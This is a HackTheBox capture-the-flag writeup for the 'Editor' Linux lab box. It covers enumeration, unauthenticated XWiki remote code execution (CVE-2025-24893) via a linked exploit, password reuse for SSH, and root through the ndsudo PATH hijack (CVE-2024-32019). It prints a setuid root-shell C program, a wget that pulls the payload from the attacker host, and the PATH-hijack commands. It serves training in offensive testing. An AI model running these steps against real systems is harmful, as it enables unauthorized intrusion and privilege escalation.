---
title: "Editor — HackTheBox Writeup"
description: EASY Difficulty
date: 2025-12-18 12:00:00 +0000
categories: [Writeups, HackTheBox]
tags: [Linux, Easy, Web, Path Injection, SUID, PrivEsc]
image:
  path: /assets/Editor_img/editor_banner.png
---
# Scope & Objective

Target IP → 10.10.11.80

Linux Host

EASY Difficulty

No initial creds. Complete blackbox assessment

---

# ENUMERATION

## Nmap Scan

```bash
┌──(root㉿BermudaDark)-[/home/cthulhu/htb/editor]
└─# nmap -sC -sV -vv -oA editor.nmap 10.10.11.80
...
...
...
PORT     STATE SERVICE REASON         VERSION
**22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)**
| ssh-hostkey:
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJ+m7rYl1vRtnm789pH3IRhxI4CNCANVj+N5kovboNzcw9vHsBwvPX3KYA3cxGbKiA0VqbKRpOHnpsMuHEXEVJc=
|   256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOtuEdoYxTohG80Bo6YCqSzUY9+qbnAFnhsk4yAZNqhM
**80/tcp   open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)**
| http-methods:
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Editor - SimplistCode Pro
**8080/tcp open  http    syn-ack ttl 63 Jetty 10.0.20**
|_http-open-proxy: Proxy might be redirecting requests
| http-cookie-flags:
|   /:
|     JSESSIONID:
|_      **httponly flag not set**
| http-webdav-scan:
|   WebDAV type: Unknown
|   Allowed Methods: OPTIONS, GET, HEAD, PROPFIND, LOCK, UNLOCK
|_  Server Type: Jetty(10.0.20)
|_http-server-header: Jetty(10.0.20)
| http-**robots.txt**: 50 disallowed entries (40 shown)
| /xwiki/bin/viewattachrev/ /xwiki/bin/viewrev/
| /xwiki/bin/pdf/ /xwiki/bin/edit/ /xwiki/bin/create/
| /xwiki/bin/inline/ /xwiki/bin/preview/ /xwiki/bin/save/
| /xwiki/bin/saveandcontinue/ /xwiki/bin/rollback/ /xwiki/bin/deleteversions/
| /xwiki/bin/cancel/ /xwiki/bin/delete/ /xwiki/bin/deletespace/
| /xwiki/bin/undelete/ /xwiki/bin/reset/ /xwiki/bin/register/
| /xwiki/bin/propupdate/ /xwiki/bin/propadd/ /xwiki/bin/propdisable/
| /xwiki/bin/propenable/ /xwiki/bin/propdelete/ /xwiki/bin/objectadd/
| /xwiki/bin/commentadd/ /xwiki/bin/commentsave/ /xwiki/bin/objectsync/
| /xwiki/bin/objectremove/ /xwiki/bin/attach/ /xwiki/bin/upload/
| /xwiki/bin/temp/ /xwiki/bin/downloadrev/ /xwiki/bin/dot/
| /xwiki/bin/delattachment/ /xwiki/bin/skin/ /xwiki/bin/jsx/ /xwiki/bin/ssx/
| /xwiki/bin/login/ /xwiki/bin/loginsubmit/ /xwiki/bin/loginerror/
|_/xwiki/bin/logout/
| http-methods:
|   Supported Methods: OPTIONS GET HEAD PROPFIND LOCK UNLOCK
|_  Potentially risky methods: PROPFIND LOCK UNLOCK
| http-title: XWiki - Main - Intro
|_Requested resource was **http://editor.htb:8080/xwiki/bin/view/Main/**
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
...
```

### /etc/hosts

```bash
10.10.11.80 editor.htb
```

---

## HTTP Enumeration

To-Do List:

- [x]  dirsearch
- [x]  app functionality

### dirsearch

```bash
┌──(root㉿BermudaDark)-[/home/cthulhu/htb/editor]
└─# dirsearch -u http://editor.htb/ -r
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/cthulhu/htb/editor/reports/http_editor.htb/__25-11-10_10-02-10.txt

Target: http://editor.htb/

[10:02:10] Starting:
[10:02:21] 301 -  178B  - /assets  ->  http://editor.htb/assets/
Added to the queue: assets/
[10:02:21] 403 -  564B  - /assets/

[10:02:54] Starting: assets/

Task Completed
```

We do get one discovery but it’s not that interesting to us.

### App functionality

Navigating to the initial webpage:

![image.png](/assets/Editor_img/image.png)

Just kind of playing with the website, we don’t get any indication of a way in. We can check the port 8080 web server next.

## HTTP 8080 Enumeration

![image.png](/assets/Editor_img/image%201.png)

Navigating to the website, we are redirected to this xwiki page. At the very bottom, we do notice a server version — **XWiki Debian 15.10.8**

## Running a CVE Search

Doing a simple google search, we’re able to find a Critical CVE find on our XWiki Version Number

[CVE-2025-24893 – Unauthenticated Remote Code Execution in XWiki via SolrSearch Macro](https://www.offsec.com/blog/cve-2025-24893/)

> A critical unauthenticated remote code execution (RCE) vulnerability in XWiki versions prior to **15.10.11**, **16.4.1**, and **16.5.0RC1**. The flaw resides in how the `SolrSearch` macro improperly handles Groovy expressions inside search queries, which allows attackers to execute arbitrary Groovy code with any authentication on the web server.
> 

### Vulnerable Code

```bash
def query = "search=${params.search}"  // No sanitization
def result = evaluate(query)           // Dangerous use of evaluate()
```

Sending a malicious POST request to Macro

```bash
http://editor.htb/xwiki/bin/view/Main/SolrSearchMacros?search=< Groovy RCE Here >
```

In my case, the provided POC from the link above seemed to not work, but you can get a working POC from here:
[https://github.com/gunzf0x/CVE-2025-24893/blob/main/CVE-2025-24893.py](https://github.com/gunzf0x/CVE-2025-24893/blob/main/CVE-2025-24893.py)
Just do a simple copy paste on the raw file or do a git clone!

---

# INITIAL EXPLOITATION

## Shell as `xwiki`

Running the POC:

![image.png](/assets/Editor_img/image%202.png)

** Make sure you have a netcat listener running on the same port **

### Running `netcat` with a stable `tty shell`

![image.png](/assets/Editor_img/image%203.png)

We now have initial access on the target machine!

## XWiki Important File Search

Attempting to manually enumerate seemed redundent, since we don’t have sudo privileges and we don’t know of any xwiki files that might be able to help us, however, we can find out with a simple google search:

![image.png](/assets/Editor_img/image%204.png)

According to Google Gemini, there is a file `hibernate.cfg.xml` that contains database configuration settings for an xwiki database on the system. 

```bash
xwiki@editor:/$ find / -name hibernate.cfg.xml 2>/dev/null
/etc/xwiki/hibernate.cfg.xml
/usr/lib/xwiki/WEB-INF/hibernate.cfg.xml
/usr/share/xwiki/templates/mysql/hibernate.cfg.xml
```

** You can take a look at any of the three, they are all the same copy of the file **

## Database Credentials Discovered

![image.png](/assets/Editor_img/image%205.png)

We do get a set of database credentials:

```bash
xwiki : the......99
```

From this point, I was able to gain access into the `mariadb mysql` server using the discovered creds and there was nothing of interest. So, I backed up to see what users were on the system via `/etc/passwd` and found another user `oliver`

![image.png](/assets/Editor_img/image%206.png)

---

# POST EXPLOITATION

## SSH Access via `Oliver`

It seems that the password we discovered also belonged to the user `oliver`

![image.png](/assets/Editor_img/image%207.png)

** You can grab the user flag here **

## Post Enumeration

We do not have sudo rights on the machine as `oliver`

```bash
oliver@editor:~$ sudo -l
[sudo] password for oliver:
Sorry, user oliver may not run sudo on editor.
```

I decided to run `linpeas` to see what the output tells us:

![image.png](/assets/Editor_img/image%208.png)

Now, this is very interesting. 

These are **executables with the SUID bit set** that **do not belong to standard/common binaries** (like `/usr/bin/passwd` or `/usr/bin/sudo`). 

These binaries always run as `root` regardless of who is executing them

If you can influence their behavior (add custom code) you can potentially escalate privileges on the system.

One that sticks out to me the most is **nsdsudo**

## Privilege Escalation : “ndsudo” untrusted search path

Doing a simple google search on `ndsudo` listed out **CVE-2024-32019**

[NVD - CVE-2024-32019](https://nvd.nist.gov/vuln/detail/CVE-2024-32019)

> According to NIST, Netdata is an open source observability tool. The `ndsudo` tool is packaged as a `root` owned executable with the SUID bit set while running a set of external commands. The search path is supplied by the `PATH` environment variable. This allows attackers to control where `ndsudo` looks for these commands from any path (could be a path the attacker has write access to).
> 

## POC : ROOT

For this to work, we need to create an executable with a name that is on `ndsudo`'s list of commands in a writable path.

```bash
oliver@editor:/tmp$ /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo -h

ndsudo

(C) Netdata Inc.

A helper to allow Netdata run privileged commands.

  --test
    print the generated command that will be run, without running it.

  --help
    print this message.

The following commands are supported:

- Command    : nvme-list
  Executables: **nvme**
  Parameters : list --output-format=json

- Command    : nvme-smart-log
  Executables: nvme
  Parameters : smart-log {{device}} --output-format=json

- Command    : megacli-disk-info
  Executables: megacli MegaCli
  Parameters : -LDPDInfo -aAll -NoLog

- Command    : megacli-battery-info
  Executables: megacli MegaCli
  Parameters : -AdpBbuCmd -aAll -NoLog

- Command    : arcconf-ld-info
  Executables: arcconf
  Parameters : GETCONFIG 1 LD

- Command    : arcconf-pd-info
  Executables: arcconf
  Parameters : GETCONFIG 1 PD

The program searches for executables in the system path.

Variables given as {{variable}} are expected on the command line as:
  --variable VALUE

VALUE can include space, A-Z, a-z, 0-9, _, -, /, and .
```

`nvme` seems like a good choice to use in our case. 

So, we can’t write a python script since they drop privileges by design and bash can’t set UID’s or GID’s. Our most recommended option would be to write a small c program that can escalate our privileges. 

Do this on your host:

```bash
#include <unistd.h>

int main() {
	setuid(0); setgid(0;
	execl("/bin/bash", "bash", NULL);
	return 0;
}
```

You can find more information on the POC here:

[https://github.com/AzureADTrent/CVE-2024-32019-POC](https://github.com/AzureADTrent/CVE-2024-32019-POC)

compile it:

```bash
gcc exploit.c -o nvme
```

Transfer it over (make sure you are on a writable directory! `/home/oliver` is a good choice):

```bash
python3 -m http.server 80
wget http://kali-ip/nvme
```

Change the permissions (make it executable):

```bash
chmod +x nvme
```

Prepend the wirtable directory to your PATH:

```bash
export PATH=/home/oliver:$PATH
```

and execute the `ndsudo` command and call the correct `nvme` command as follows:

```bash
/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list
```

You should be put in a `root` shell!!

![image.png](/assets/Editor_img/image%209.png)

You can grab the root flag here!

# Machine PWN3D!
